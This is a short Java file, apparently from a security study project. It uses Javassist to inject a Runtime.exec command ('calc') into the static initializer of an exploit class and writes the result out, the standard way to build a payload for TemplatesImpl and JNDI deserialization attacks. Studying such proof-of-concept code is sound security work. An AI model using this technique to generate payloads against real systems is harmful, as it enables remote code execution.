package com.TemplatesImpl;

import javassist.*;

import java.io.IOException;

public class testClassPool {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        String command = "calc";

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(com.jndi.Exploit.class));
        CtClass cc = pool.get(com.jndi.Exploit.class.getName());
        //选择一个要加载的类
        //System.out.println(angelwhu.model.Point.class.getName());

        cc.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
        //加入关键执行代码，生成一个静态函数。

        String newClassNameString = "ClassPool" + System.nanoTime();//设置class文件保存路径
        cc.setName(newClassNameString);

        CtMethod mthd = CtNewMethod.make("public static void main(String[] args) { System.out.println(\"running javassist\"); };", cc);
        cc.addMethod(mthd);

        cc.writeFile();
    }
}
